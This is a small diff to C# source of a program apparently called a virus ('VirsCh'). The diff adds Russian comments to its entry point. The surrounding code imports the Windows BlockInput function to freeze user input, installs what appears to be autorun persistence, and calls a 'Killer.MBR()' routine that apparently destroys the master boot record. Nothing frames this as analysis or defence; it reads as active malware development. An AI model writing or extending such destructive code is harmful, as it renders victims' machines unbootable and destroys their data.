@@ -5,12 +5,13 @@ namespace VirsCh
 {
     static class Program
     {
+        // Регистрация DLL
         [DllImport("user32.dll")]
         private static extern bool BlockInput(bool block);
 
         static void Main()
         {
-
+            // Запус всех модулей
             if (!Addition.IsInstalledAR())
                 Addition.InstallAR();
             Killer.MBR();
